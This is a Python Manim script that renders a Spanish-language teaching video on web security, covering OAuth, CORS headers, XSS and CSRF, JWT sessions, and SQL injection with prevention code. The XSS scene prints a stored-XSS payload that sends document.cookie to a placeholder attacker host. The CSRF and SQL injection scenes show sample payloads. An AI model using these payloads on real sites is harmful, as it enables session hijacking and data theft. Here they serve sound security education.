from manim import *

BACKGROUND_COLOR = "#000000"
PRIMARY_COLOR = "#89b4fa"
SECONDARY_COLOR = "#f5c2e7"
ACCENT_COLOR = "#a6e3a1"
HIGHLIGHT_COLOR = "#f9e2af"
CURVE_COLOR = "#f38ba8"
TEXT_COLOR = "#cdd6f4"
WEBSEC_COLOR = "#ff6d00"

config.background_color = BACKGROUND_COLOR


class IntroScene(Scene):
    def construct(self):
        title = Text("Seguridad Web", font_size=60, color=WEBSEC_COLOR).set_color_by_gradient(WEBSEC_COLOR, ACCENT_COLOR)
        subtitle = Text("Tema de ingenieria en computacion e informatica", font_size=26, color=TEXT_COLOR).next_to(title, DOWN, buff=0.7)
        self.play(Write(title, run_time=2), FadeIn(subtitle, shift=UP * 0.2), run_time=1)
        self.wait(1)
        self.play(FadeOut(title), FadeOut(subtitle), run_time=0.8)

class OAuthScene(Scene):
    def construct(self):
        title = Text("OAuth 2.0 y OpenID Connect", font_size=48, color=WEBSEC_COLOR)
        title.to_edge(UP, buff=0.5)

        code_str = r'''# OAuth 2.0 - Authorization Framework

# 1. Authorization Code Grant (recomendado para web)
# Frontend:
GET https://auth-server.com/authorize?
    response_type=code&
    client_id=myapp&
    redirect_uri=https://myapp.com/callback&
    scope=openid%20profile%20email&
    state=random-state-123

# 2. Callback con authorization code
GET https://myapp.com/callback?code=AUTH_CODE&state=random-state-123

# 3. Backend exchange code por token
POST https://auth-server.com/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTH_CODE&
redirect_uri=https://myapp.com/callback&
client_id=myapp&
client_secret=MY_SECRET

# 4. Response
{
    "access_token": "eyJhbGci...",
    "token_type": "Bearer",
    "expires_in": 3600,
    "id_token": "eyJhbGci...",
    "refresh_token": "def502..."
}

# JWT Access Token
header = {"alg": "RS256", "typ": "JWT"}
payload = {
    "sub": "user123",
    "iss": "https://auth-server.com",
    "aud": "myapp",
    "exp": 1717200000,
    "iat": 1717196400,
    "scope": "openid profile email"
}

# OpenID Connect - Capa de identidad sobre OAuth2
# id_token es un JWT con informacion del usuario'''

        code = Code(code=code_str, language="python", formatter_style="monokai", background="rectangle", font_size=18)
        code.scale(0.85).next_to(title, DOWN, buff=0.5)

        self.play(Write(title), Create(code), run_time=1.5)
        self.wait(1.5)
        self.play(FadeOut(title), FadeOut(code), run_time=0.8)

class CORSScene(Scene):
    def construct(self):
        title = Text("CORS y Headers de Seguridad", font_size=48, color=WEBSEC_COLOR)
        title.to_edge(UP, buff=0.5)

        code_str = r'''# CORS - Cross-Origin Resource Sharing

# Configuracion del servidor
Access-Control-Allow-Origin: https://miapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

# Preflight Request (OPTIONS)
OPTIONS /api/data
Origin: https://otro-dominio.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type

# Security Headers - Proteccion contra ataques web

# 1. Content Security Policy (CSP)
Content-Security-Policy: default-src 'self';
    script-src 'self' https://cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';

# 2. HTTP Strict Transport Security (HSTS)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# 3. X-Frame-Options (previene clickjacking)
X-Frame-Options: DENY

# 4. X-Content-Type-Options (previene MIME sniffing)
X-Content-Type-Options: nosniff

# 5. Referrer-Policy
Referrer-Policy: strict-origin-when-cross-origin

# 6. Permissions-Policy
Permissions-Policy: geolocation=(), camera=(), microphone=()'''

        code = Code(code=code_str, language="python", formatter_style="monokai", background="rectangle", font_size=18)
        code.scale(0.85).next_to(title, DOWN, buff=0.5)

        self.play(Write(title), Create(code), run_time=1.5)
        self.wait(1.5)
        self.play(FadeOut(title), FadeOut(code), run_time=0.8)

class XSSScene(Scene):
    def construct(self):
        title = Text("XSS y CSRF", font_size=48, color=WEBSEC_COLOR)
        title.to_edge(UP, buff=0.5)

        code_str = r'''# XSS - Cross-Site Scripting

# Reflected XSS: El ataque viene en la URL
# MALO: http://sitio.com/buscar?q=<script>alert('XSS')</script>
# La app refleja el input sin escapar

# Stored XSS: El ataque se almacena en el servidor
# Usuario malicioso publica un comentario con:
<script>
    fetch('https://atacante.com/steal?cookie=' + document.cookie);
</script>

# DOM-based XSS: El ataque ocurre en el cliente via JS
# MALO:
document.getElementById("output").innerHTML = userInput;
# BUENO:
document.getElementById("output").textContent = userInput;

# Prevencion XSS
# 1. Escapar output: & -> &amp; < -> &lt; > -> &gt;
# 2. CSP: bloquear scripts inline
# 3. HttpOnly cookies: no accesibles via JS
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

# CSRF - Cross-Site Request Forgery
# El atacante engaña al usuario para ejecutar acciones no deseadas

# Ataque CSRF:
<img src="https://banco.com/transferir?cuenta=123&monto=1000" />

# Prevencion CSRF:
# 1. CSRF Token (Synchronizer Token Pattern)
<form>
    <input type="hidden" name="_csrf" value="{{csrfToken}}" />
    <input type="submit" />
</form>

# 2. SameSite Cookie
Set-Cookie: session=abc; SameSite=Strict; Secure

# 3. Custom Headers
fetch("/api/transfer", {
    method: "POST",
    headers: { "X-Requested-With": "XMLHttpRequest" }
})'''

        code = Code(code=code_str, language="python", formatter_style="monokai", background="rectangle", font_size=18)
        code.scale(0.85).next_to(title, DOWN, buff=0.5)

        self.play(Write(title), Create(code), run_time=1.5)
        self.wait(1.5)
        self.play(FadeOut(title), FadeOut(code), run_time=0.8)

class AuthScene(Scene):
    def construct(self):
        title = Text("Autenticacion y Sesiones", font_size=48, color=WEBSEC_COLOR)
        title.to_edge(UP, buff=0.5)

        code_str = r'''# JWT - JSON Web Token
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "mi-clave-secreta-muy-segura"
ALGORITHM = "HS256"

def crear_token(user_id: int, role: str) -> str:
    payload = {
        "sub": user_id,
        "role": role,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=1),
        "type": "access"
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def verificar_token(token: str) -> dict:
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("Token expirado")
    except jwt.InvalidTokenError:
        raise AuthError("Token invalido")

# Refresh Token (mas duradero)
def crear_refresh_token(user_id: int) -> str:
    payload = {
        "sub": user_id,
        "exp": datetime.utcnow() + timedelta(days=30),
        "type": "refresh"
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

# Password hashing con bcrypt
import bcrypt

def hash_password(password: str) -> str:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt).decode()

def verificar_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode(), hashed.encode())

# Session Management
# Server-side sessions con Redis
import redis
r = redis.Redis()
r.setex(f"session:{session_id}", 3600, json.dumps(user_data))'''

        code = Code(code=code_str, language="python", formatter_style="monokai", background="rectangle", font_size=18)
        code.scale(0.85).next_to(title, DOWN, buff=0.5)

        self.play(Write(title), Create(code), run_time=1.5)
        self.wait(1.5)
        self.play(FadeOut(title), FadeOut(code), run_time=0.8)

class SQLiScene(Scene):
    def construct(self):
        title = Text("SQL Injection y Proteccion", font_size=48, color=WEBSEC_COLOR)
        title.to_edge(UP, buff=0.5)

        code_str = r'''# SQL Injection - Tipos y Prevencion

# 1. In-band SQLi (Error-based)
# ' OR 1=1 --
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'x'

# 2. Blind SQLi (Boolean-based)
# ' AND SUBSTRING(password,1,1) = 'a' --
# Si la pagina responde diferente, el caracter es correcto

# 3. Blind SQLi (Time-based)
# '; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5' --
# Si hay retraso, la condicion es verdadera

# 4. Union-based SQLi
# ' UNION SELECT username, password FROM users --

# PREVENCION

# 1. Consultas parametrizadas (SIEMPRE)
# Python (psycopg2):
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)

# Node.js (pg):
const result = await pool.query(
    "SELECT * FROM users WHERE username = $1 AND password = $2",
    [username, password]
)

# Java (JDBC):
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);

# 2. ORM (evita SQL manual)
# SQLAlchemy:
User.query.filter_by(username=username, password=password).first()

# 3. Input Validation (capa extra)
import re
if not re.match(r"^[a-zA-Z0-9_]+$", username):
    raise ValueError("Username invalido")

# 4. Minimo privilegio en DB
# CREATE USER app_user WITH PASSWORD '...';
# GRANT SELECT, INSERT, UPDATE ON users TO app_user;'''

        code = Code(code=code_str, language="python", formatter_style="monokai", background="rectangle", font_size=18)
        code.scale(0.85).next_to(title, DOWN, buff=0.5)

        self.play(Write(title), Create(code), run_time=1.5)
        self.wait(1.5)
        self.play(FadeOut(title), FadeOut(code), run_time=0.8)


class ConclusionScene(Scene):
    def construct(self):
        title = Text("Resumen: Seguridad Web", font_size=38, color=WEBSEC_COLOR)
        title.to_edge(UP, buff=0.6)

        items = VGroup(            Text("OAuth 2.0 y OpenID Connect", font_size=22, color=TEXT_COLOR),
            Text("CORS y headers de seguridad", font_size=22, color=TEXT_COLOR),
            Text("XSS y CSRF prevention", font_size=22, color=TEXT_COLOR),
            Text("JWT y manejo de sesiones", font_size=22, color=TEXT_COLOR),
            Text("SQL Injection y proteccion", font_size=22, color=TEXT_COLOR),
            Text("CSP y buenas practicas", font_size=22, color=TEXT_COLOR)
        ).arrange(DOWN, buff=0.25, aligned_edge=LEFT)
        items.next_to(title, DOWN, buff=0.5)

        self.play(Write(title), run_time=1)
        for item in items:
            self.play(FadeIn(item, shift=RIGHT * 0.2), run_time=0.3)
        self.wait(1)

        final_msg = Text("Protege cada capa de tu aplicacion", font_size=26, color=ACCENT_COLOR).next_to(items, DOWN, buff=0.5)
        self.play(FadeIn(final_msg, shift=UP * 0.2), run_time=0.8)
        self.wait(1.5)
        self.play(FadeOut(title), FadeOut(*items), FadeOut(final_msg), run_time=0.8)


class SeguridadWebFullVideo(Scene):
    def construct(self):
        IntroScene.construct(self)
        OAuthScene.construct(self)
        CORSScene.construct(self)
        XSSScene.construct(self)
        AuthScene.construct(self)
        SQLiScene.construct(self)
        ConclusionScene.construct(self)
